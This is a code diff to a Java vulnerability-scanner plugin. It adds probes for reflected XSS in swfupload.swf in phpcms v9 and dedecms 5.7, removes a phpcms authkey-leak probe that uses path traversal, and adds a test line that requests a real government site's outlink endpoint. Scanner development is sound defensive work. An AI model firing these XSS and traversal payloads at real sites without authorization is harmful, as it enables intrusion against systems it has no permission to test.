@@ -13,6 +13,7 @@ import org.apache.http.Header;
 import org.javaweb.core.net.HttpRequest;
 import org.javaweb.core.net.HttpResponse;
 import org.javaweb.core.net.HttpURLRequest;
+import us.codecraft.webmagic.utils.HttpConstant;
 
 import java.net.MalformedURLException;
 import java.util.ArrayList;
@@ -32,19 +33,25 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
 
                 loaders.add(
                         Payloader.builder()
-                                .url("/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\\..\\..\\phpsso_server\\caches\\caches_admin\\caches_data\\applist&path=admin")
-                                .custom(
-                                        new Custom() {
-                                            @Override
-                                            public boolean fun( HttpResponse response) throws Exception {
-                                                return response.body().contains("aaaaa")?true:false;//如果响应体包含aaaaa则存在漏洞
-                                            }
-                                        }
-                                ).vuln(Vulnerable.builder().level(Vulnerable.Level.HIGH.getLevel())
-                                .type(Vulnerable.Type.INFO_LEAKAGE.getType())
-                                .title("phpcms authkey泄漏")
-                                .build())
-                                .build()
+                        .url("/statics/js/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(1)}}//")
+                        .custom(new Custom() {
+                            @Override
+                            public boolean fun(HttpResponse response) throws Exception {
+                                if (    response!=null &&
+                                        response.getStatusCode() == 200 &&
+                                        response.getContentType().contains("flash")){
+                                    return true;
+                                }
+                                return false;
+                            }
+                        })
+                        .vuln(
+                                Vulnerable.builder()
+                                .type(Vulnerable.Type.XSS.getType())
+                                .level(Vulnerable.Level.HIGH.getLevel())
+                                .title("phpcms v9 swfupload.swf flash xss").build()
+                        )
+                        .build()
                 );
 
                 loaders.add(
@@ -63,6 +70,28 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
 
                 break;
             case $Discuz:
+                break;
+            case $dedecms:
+                ///images/swfupload/swfupload.swf?movieName="])}catch(e){if(!window.x){window.x=1;alert("xss")}}//
+                loaders.add(
+                        Payloader.builder()
+                                .url("/images/swfupload/swfupload.swf?movieName=\"])}catch(e){if(!window.x){window.x=1;alert(\"xss\")}}//")
+                                .custom(new Custom() {
+                                    @Override
+                                    public boolean fun(HttpResponse response) throws Exception {
+                                        if (    response!=null &&
+                                                response.getStatusCode() == 200 &&
+                                                response.getContentType().contains("flash")){
+                                            return true;
+                                        }
+                                        return false;
+                                    }
+                                })
+                                .vuln(Vulnerable.builder().title("dedecms 5.7 /swfupload.swf 反射xss")
+                                .level(Vulnerable.Level.HIGH.getLevel()).type(Vulnerable.Type.XSS.getType()).build())
+                                .build()
+                );
+
                 break;
             default:
                 /**
@@ -198,6 +227,9 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
         }
     }
 
+    public static void main(String[] args) throws MalformedURLException {
+        System.out.println(new HttpURLRequest().url("http://www.epb.dl.gov.cn/OutLink/Law.aspx?url=http://www.httpbin.org/get").get().body());
+    }
     private void test(List<Payloader> payloaders) {
         SysLog.info("符合要求的有"+payloaders.size()+"个简单的漏洞规则");
         for (Payloader payloader : payloaders) {
@@ -207,8 +239,13 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                 HttpResponse resp = null;
                 if (req == null) {
                     req = new HttpURLRequest()
-                            .url(payloader.url)
-                            .method(payloader.method);
+                            .url(target.concat(payloader.url));
+                    if (payloader.method !=null){
+                        req.method(payloader.method);
+                    }else{
+                        req.method(HttpRequest.Method.GET);
+                    }
+
                     if (StringUtils.isNotBlank(payloader.data)) {
                         req.data(payloader.data);
                     }
@@ -217,7 +254,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                         req.header(payloader.header);
                     }
 
-                    if (payloader.method == HttpRequest.Method.GET)
+                    if (req.getMethod() == HttpConstant.Method.GET)
                         resp = req.get();
                     else
                         resp = req.post();
@@ -233,6 +270,7 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                             addVul(payloader);
                         }
                     } catch (Exception e) {
+                        task.getExceptions().add(e);
                         continue;
                     }
                 }else{
@@ -251,7 +289,9 @@ public class SimpleVulRule extends InnerPlugin<List<Vulnerable>> {
                 }
 
 
-            }catch (Exception e){}
+            }catch (Exception e){
+                task.getExceptions().add(e);
+            }
 
 
         }
